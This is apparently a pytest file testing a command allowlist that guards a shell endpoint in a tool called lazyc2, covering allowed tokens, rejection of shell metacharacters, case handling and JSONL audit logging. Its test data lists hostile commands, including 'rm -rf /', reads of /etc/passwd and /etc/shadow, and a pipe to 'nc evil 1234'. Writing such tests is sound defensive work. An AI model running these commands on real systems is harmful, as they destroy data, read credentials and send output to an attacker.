"""TDD tests for the command allowlist contract.

Contract: ``lazyc2.security.command_allowlist.CommandAllowlist`` gates the
``/api/run`` endpoint so only whitelisted first tokens reach the shell.

Invariants:

1. The allowlist is matched on the first whitespace-delimited token.
2. A blank or non-string command is rejected.
3. Shell metacharacters anywhere in the command are rejected, even if the
   first token is in the allowlist (defence in depth).
4. Case-insensitive matching is supported.
5. The audit log is a single JSON object per line.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from lazyc2.security.command_allowlist import (
    CommandAllowlist,
    CommandDecision,
    CommandRejectionReason,
)


class TestBasicAllow:
    """Verify the happy path."""

    def test_known_command_is_allowed(self) -> None:
        allowlist = CommandAllowlist(["ping", "set", "show"])
        decision = allowlist.check("ping 10.0.0.1")
        assert decision.allowed is True
        assert decision.reason is None

    def test_unknown_command_is_denied(self) -> None:
        allowlist = CommandAllowlist(["ping", "set"])
        decision = allowlist.check("rm -rf /")
        assert decision.allowed is False
        assert decision.reason is CommandRejectionReason.NOT_ALLOWED


class TestShellMetachars:
    """Verify that metacharacters always result in rejection."""

    @pytest.mark.parametrize(
        "payload",
        [
            "ping; cat /etc/passwd",
            "ping && cat /etc/passwd",
            "ping | nc evil 1234",
            "ping `whoami`",
            "ping $(whoami)",
            "ping > /etc/cron.d/x",
            "ping < /etc/shadow",
        ],
    )
    def test_metachar_rejected(self, payload: str) -> None:
        allowlist = CommandAllowlist(["ping", "set", "show"])
        decision = allowlist.check(payload)
        assert decision.allowed is False
        assert decision.reason in {
            CommandRejectionReason.SHELL_METACHAR,
            CommandRejectionReason.NOT_ALLOWED,
        }


class TestEmptyInput:
    """Verify edge cases on the input shape."""

    def test_empty_string_rejected(self) -> None:
        allowlist = CommandAllowlist(["ping"])
        decision = allowlist.check("")
        assert decision.allowed is False
        assert decision.reason is CommandRejectionReason.EMPTY

    def test_whitespace_only_rejected(self) -> None:
        allowlist = CommandAllowlist(["ping"])
        decision = allowlist.check("   \t  ")
        assert decision.allowed is False
        assert decision.reason is CommandRejectionReason.EMPTY

    def test_non_string_rejected(self) -> None:
        allowlist = CommandAllowlist(["ping"])
        decision = allowlist.check(None)  # type: ignore[arg-type]
        assert decision.allowed is False
        assert decision.reason is CommandRejectionReason.EMPTY


class TestCaseInsensitive:
    """Verify case-insensitive matching."""

    def test_uppercase_token_matches(self) -> None:
        allowlist = CommandAllowlist(["ping", "set"])
        assert allowlist.check("PING 10.0.0.1").allowed is True
        assert allowlist.check("Set rhost 1.1.1.1").allowed is True


class TestAuditLog:
    """Verify the audit log is written line-by-line JSON."""

    def test_audit_log_appends_jsonl(self, tmp_path: Path) -> None:
        log_path = tmp_path / "audit.jsonl"
        allowlist = CommandAllowlist(["ping"], audit_log_path=log_path)
        allowlist.check("ping 10.0.0.1")
        allowlist.check("rm -rf /")
        content = log_path.read_text(encoding="utf-8").splitlines()
        assert len(content) == 2
        record_allowed = json.loads(content[0])
        record_denied = json.loads(content[1])
        assert record_allowed["allowed"] is True
        assert record_denied["allowed"] is False

    def test_audit_log_disabled_is_noop(self, tmp_path: Path) -> None:
        allowlist = CommandAllowlist(["ping"], audit_log_path=None)
        allowlist.check("ping 10.0.0.1")
        assert list(tmp_path.iterdir()) == []
